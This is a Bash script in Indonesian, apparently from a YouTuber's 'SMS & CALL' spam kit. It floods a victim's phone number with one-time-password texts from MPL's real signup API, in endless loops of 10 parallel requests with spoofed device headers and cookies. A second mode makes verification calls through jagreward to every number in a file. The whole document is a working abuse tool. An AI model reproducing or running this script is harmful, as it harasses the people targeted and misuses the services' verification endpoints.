#!/usr/bin/env bash

# subscribe pejuang kentang

# plugins bash moderen
. lib/moduler.sh
# depencies
Bash.import: text_display/colorama text_display/IO.ECHO
Bash.import: util/io.class util/IO.FUNC
Bash.import: util/operator util/IO.SYSTEM.var
Bash.import: urlib/pyreq
#------------{ variable base rest api }-------------------#
var default_headers : "";
var apis : "https://www.mpl.id/api/applink";
var methods : "";
var caller : "https://id.jagreward.com/member/verify-mobile/"

# --------------{ membutuhkan pack.sh }-----------------#
@require modules/pack.sh
#---------------{ class mekanisme spam }-----------------#
class main; {
	public: app = sms;
	public: app = call;
} && {
#---------{ object sms }----------#
	def: main::sms(){
		global: nomer = "$@";# nama argument
		var gelud : $(shuf -i 5-11 -n 1);
#---------{ body syntax python }---------#
		var modul : $(cat << EOF
headers = {
    'Host': 'global-api.mpl.live',
    'language': 'in',
    'user-agent': 'mpl-android/1000153 (RV-153)',
    'apptype': 'Cash',
    'countrycode': 'ID',
    'countrycallingcode': '0',
    'flavorname': 'production_global_nowtm',
    'buildtype': 'false',
    'islogenabled': 'false',
    'isdevelopmentenabled': 'false',
    'versionname': '1.0.153_MPL_Production_ID_nowtm',
    'buildtime': '20211215_11_23',
    'deviceid': 'a4790cc74c2fefda',
    'osversioncode': '29',
    'osversion': '10',
    'make': 'ROG',
    'model': 'NEWS-VERSION',
    'manufacturer': 'ROG',
    'devicearch': 'armv8l',
    'apktype': 'INDO_IA_NWTM_MISSIONS',
    'deviceidnew': 'a4790cc74c2fefda',
    'countrycodenew': 'ID',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    'content-length': '193',
    'accept-encoding': 'gzip',
    };
    nomor = "$nomer";
    data = '{"countryCode":62,"mobileNumber":"' + nomor + '","referrerCode":"","signUpOfferCode":"","imei":{"imei1":"","imei2":""},"gameId":1000002,"ivbb":"","userUid":"a0861be9-9c71-44ae-b9a2-6a63b8edba48"}';
    res = req.post('https://global-api.mpl.live/auth/init/otp', headers=headers, data=data).text;
EOF
)
	var pw : $(echo "$RANDOM"|base64)
#-----------------------{ base api 2 }-----------------#
	var ref : $(curl -sL -X POST --ssl -H "user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" -H "referer: https://www.mpl.id/?mobile=85731184377" -H 'cookie: gcl_au=1.1.173982943.1648991375; _gid=GA1.2.1916794866.1648991376; _fbp=fb.1.1648991376707.690110363; _uetsid=79fac830b35111ec9fba4d813d4ded86; _uetvid=79fb5060b35111eca6ba1909185337e2; _hjSessionUser_1696874=eyJpZCI6IjEzOGQzM2Y0LWQ4YzctNTczNS1hOTc5LTg5MWNjOTM3ODQzYiIsImNyZWF0ZWQiOjE2NDg5OTIzMDY4NTAsImV4aXN0aW5nIjpmYWxzZX0=; _ga=GA1.2.1722677761.1648991376; _ga_Y2HJP5CQFP=GS1.1.1648992307.1.0.1648993230.60; _ga_X3TGQ1DPDD=GS1.1.1648992307.1.0.1648993230.0; RT="z=1&dm=www.mpl.id&si=57fbc1f9-d810-49d7-b898-d9f69d080ea0&ss=l1k9pnm7&sl=0&tt=0"; _gat_UA-136971790-1=1' -H "content-type: application/json" -d '{"To":"'"+62${nomer}"'","VAR1":"DEFAULT"}' --insecure $apis --compressed)
	var s2 : $(python.req "$modul")
#----------------------{ validasi content api }---------------#
	if (ambil: s2 in OK &>/dev/null); then {
	    Tulis.strN "${ku}[${ij}√${ku}] ${bg_me}BOT INFO${bg_ij} ${st}${hi}   \tServer 1 -> True"
	    Tulis.strN "${ku}[${ij}√${ku}] ${bg_me}BOT TARGET${bg_ij} ${st}${hi} \t$nomer"
	    Tulis.strN "${ku}[${ij}√${ku}] ${bg_pu}${hi}BOT TIMES${bg_ij} ${st}${hi}  \t$(date +%H:%M:%S)${st}"
	}; else {
			Tulis.strN "${ku}[${me}✗${ku}] ${bg_me}BOT INFO${bg_ij} ${st}${hi}   \tServer 1 -> True"
            Tulis.strN "${ku}[${me}✗${ku}] ${bg_me}BOT TARGET${bg_ij} ${st}${hi} \t$nomer"
            Tulis.strN "${ku}[${me}✗${ku}] ${bg_pu}${hi}BOT TIMES${bg_ij} ${st}${hi}  \t$(date +%H:%M:%S)${st}"
	};
	 fi
#------------------{ validasi content api 2 }-------------------#
	if (ambil: ref in 200 &>/dev/null); then {
            Tulis.strN "${cy}[${ij}√${cy}] ${bg_me}BOT INFO${bg_cy} ${st}${hi}   \tServer 2 -> True"
            Tulis.strN "${cy}[${ij}√${cy}] ${bg_me}BOT TARGET${bg_cy} ${st}${hi} \t$nomer"
            Tulis.strN "${cy}[${ij}√${cy}] ${bg_pu}${hi}BOT TIMES ${bg_cy} ${st}${hi}  \t$(date +%H:%M:%S)${st}"
        }; else {
            Tulis.strN "${cy}[${me}✗${cy}] ${bg_me}BOT INFO${bg_cy} ${st}${hi}  \tServer 2 -> False"
            Tulis.strN "${cy}[${me}✗${cy}] ${bg_me}BOT TARGET${bg_cy} ${st}${hi}\t$nomer"
            Tulis.strN "${cy}[${me}✗${cy}] ${bg_pu}${hi}BOT TIMES${bg_cy} ${st}${hi} \t$(date +%H:%M:%S)${st}"
        };
         fi
	}
#------------------{ object call }-------------#
	def: main::call(){
	    global: nomer = "$@";# nama argument
#------------------{ mekanisme https request menggunakan curl }------------------#
	    var req : $(curl --silent \
	                    --location \
	                    --ssl \
	                    --request GET \
	                    --insecure ${caller}${nomer}
	               );
#------------------{ validasi content }-------------------#
	   if (ambil: req in Jaringan &> /dev/null); then
	        Tulis.strN "${bi}[${me}?${bi}] ${bg_me}BOT INFO${bg_cy} ${st}${hi}   \tnull"
	        Tulis.strN "${bi}[${me}?${bi}] ${bg_me}BOT MSG${bg_cy} ${st}${hi}    \tJaringan anda tidak memadai"
	        Tulis.strN "${bi}[${me}?${bi}] ${bg_pu}${hi}HTTP RETURN${bg_cy} ${st}${hi}\t0${st}"
	   elif (ambil: req in melebihi &> /dev/null); then
	        Tulis.strN "${m}[${me}✗${m}] ${bg_me}BOT INFO${bg_cy} ${st}${hi}   \tFalse"
	        Tulis.strN "${m}[${me}✗${m}] ${bg_me}BOT TARGET${bg_cy} ${st}${hi} \t$nomer"
	        Tulis.strN "${m}[${me}✗${m}] ${bg_pu}${hi}BOT MSG${bg_cy} ${st}${hi}    \tColdown${st}"
	   elif (ambil: req in ANGKA &> /dev/null); then
	   		Tulis.strN "${cy}[${ij}√${cy}] ${bg_me}BOT INFO${bg_cy} ${st}$hi   \tTrue"
	   		Tulis.strN "${cy}[${ij}√${cy}] ${bg_me}BOT TARGET${bg_cy} ${st}$hi \t$nomer"
	   		Tulis.strN "${cy}[${ij}√${cy}] ${bg_pu}${hi}BOT MSG${st}$hi     \tWORK IT$st"
	   fi
	}
#------------------{ mengeksekusi class }-------------#
}; var GLOBERIGNORE : "*"; class.new: main spam

#------------------{ fungsi main }--------------------#
def: main(){
	 function banner(){
		var::array: warna = { '$ku' '$me' '$ij' '$bi' '$hi' '$cy' '$m' };# array warna
		var count_array : $(shuf -i 0-6 -n 1);# random angka 0 sampai 6 dengan 1 kepala
		var random : $(echo -e "1\n2\n3\n4\n5\n6" | sort -R|head -1);# sama seperti tadi
		var devices : $(whoami);# menampilkan username
		#----------------{ validasi username }-------------#
		if (ambil: devices in root &> /dev/null); then
			var result : "#";
		else
			var result : "$";
		fi
	
		Tulis.strN "${warna[$count_array]}╔═╗${hi}╔╦╗${warna[$random]}╔═╗  ${pu}| ${ku}>${hi} Author  : Speedrun ${ku}||${hi} polygon"
		Tulis.strN "${warna[$count_array]}╚═╗${hi}║║║${warna[$random]}║    ${pu}| ${ku}>$hi github  : ${m}https://github.com/Speedrun-bash"
		Tulis.strN "${warna[$count_array]}╚═╝${hi}╩ ╩${warna[$random]}╚═╝  ${pu}| ${ku}>$hi youtube : Pejuang kentang${st}"
		Tulis.strN "${bi}SMS ${m}& ${ij}CALL\n"
		Tulis.strN "${me}[${cy}${result}${me}]${m}-${ij}>${cy}(${me}Welcome to my tools${cy})${st}"
		Tulis.strN "${m}[${me}!${m}] ${pu}note ${st}:${ij} boleh reupload tapi sertakan sumber nya juga"
		Tulis.strN "${m}[${me}!${m}] ${pu}note ${st}: ${me}[${hi}subscribe pejuang kentang${me}]\n"
		Tulis.strN "${ij}✗${hi} 1${st}.${pu} ${ku}S${st}PAM SMS ${m}( ${me}MPL PARASITE ${m})"
		Tulis.strN "${ku}✗$hi 2${st}.$pu ${me}S${st}PAM CALL ${m}( ${me}massive list ${m})"
		Tulis.strN "${me}✗$hi 3${st}.$pu ${bi}E${st}XIT${me}/${hi}K${st}ELUAR ${m}( ${ij}subscribe pejuang kentang ${m})\n"
		Tulis.str "${cy}[${ku}•${me}•${cy}]${m}(${me}Chosse${m})${bi}-${ku}> ${st}"
	};

	(clear);
	(banner);

	read subscribe_pejuang_kentang
	echo
	#---------------------{ validasi input }-----------------#
	if [[ -z "$subscribe_pejuang_kentang" ]]; then
		Tulis.strN "${ku}➥ ${pu}Input No Found${st}\n"; exit
	fi
	if (test "$subscribe_pejuang_kentang" == "1") || (test "$subscribe_pejuang_kentang" == "01"); then
		Tulis.strN "${m}[${me}✗${m}] ${cy}Date${hi}  \t$(date +%H:%M:%S)"
		Tulis.strN "${m}[${me}✗${m}] ${ij}usage$hi \tgunakan 8 tanpa menggunakan 0\n"
		Tulis.str "${me}(${hi}Target${me})${m}-${ij}> ${st}"; read subrek_bang
		echo
		
		if [[ -z "$subrek_bang" ]]; then
			Tulis.strN "${me}➥ ${pu}input not found ${me}✗$st\n"; exit
		fi
		#-----------------{ looping mekanisme }---------------#
		while true; do
			for x in {1..10}; do
				spam.sms "$subrek_bang" &
			done; wait
			echo
		#-----------------{ countdown mundur }-----------------#
			for ((x = 60; x >= 0; x--)); do
				sleep 1
				Tulis.str "\r${ij}[${me}?${ij}]${bi}-${ij}>${m}(${hi}waiting${m}) ${me}[${bi}$x${me}]${st} "
			done
			echo; echo
		done
	elif (test "$subscribe_pejuang_kentang" == "2") || (test "$subscribe_pejuang_kentang" == "02"); then
		Tulis.strN "${m}[${me}✗${m}]${pu} Date ${hi} \t$(date +%H:%M:%S)${st}"
		Tulis.strN "${m}[${me}✗${m}]$ij usage $hi\tgunakan 8 tanpa menggunakan 0"
		Tulis.strN "${me}[${bi}!${me}]$me Note \t${ij}awalan nomer target pada list harus 8\n"
		Tulis.str "${bi}[${me}➥${bi}]${ku}(${me}file-list${ku})${ij}-${m}>${st} "; read pejuang_kentang
		echo
		
		if (test -z "$pejuang_kentang"); then
			Tulis.strN "${me}➥${pu} Input Not Found ${me}✗${st}\n"; exit
		fi

		if ! (test -f "$pejuang_kentang"); then
			Tulis.strN "${ku}➥$pu File tidak di temukan$me ✗\n"; exit
		fi

		if (test -z "$(cat $pejuang_kentang)"); then
			Tulis.strN "$me➥ ${pu}File empty$me ✗$st\n"; exit
		fi

		for x in $(cat $pejuang_kentang); do
			spam.call "$x"
		done; echo
		Tulis.strN "${me}[${ij}√${me}]${pu} has been completed\n$st"; exit
	elif (test "$subscribe_pejuang_kentang" == "3") || (test "$subscribe_pejuang_kentang" == "03"); then
		Tulis.strN "${me}➥${pu} out of tools$st"
		Tulis.strN "${me}➥$pu prepare"; sleep 1
		Tulis.strN "${me}➥ ${m}subscribe pejuang kentang\n$st"; exit
	fi
} && {
	#--------------------{ memulai }-------------------#
	(clear);{
	
		var ular : 0;
		var io : 0;
		var fr1 : 1;
		var fr2 : 2;
		var fr3 : 3;
		var fr4 : 4;
		
		for x in {1..3}; do
			for((i = 0; i <= 4; i++)); do
				
				let ular++;
				let io++;
				if ((ular == fr1)); then
					var frame : "-";
					var kucing : "$bi"
				elif ((ular == fr2)); then
					var frame : "+";
					var kucing : "$me"
				elif ((ular == fr3)); then
					var frame : "✗";
					var kucing : "$ij"
				elif ((ular == fr4)); then
					let ular=0;
					var frame : "•";
					var kucing : "$pu"
				elif ((io == 5)); then
					var frame : "^"
					var kucing : "${pu}"
				fi

				Tulis.str "\r${ij}$ ${pu}Subscribe Pejuang kentang ${hi}^${me}_${kucing}${frame}${st}"
				sleep 01
			done
		done; { : "kusus ini jangan di ubah lah anjer"; } && xdg-open https://youtube.com/channel/UCtu-GcxKL8kJBXpR1wfMgWg
	}
};main

#-------------------{ MPL & JAGEWARD }--------------#
#-------------------{ subscribe pejuang kentang }----------------#

# pesan :
#        subscribe pejuang kentang bang :)
#        - open source
#        - anti token
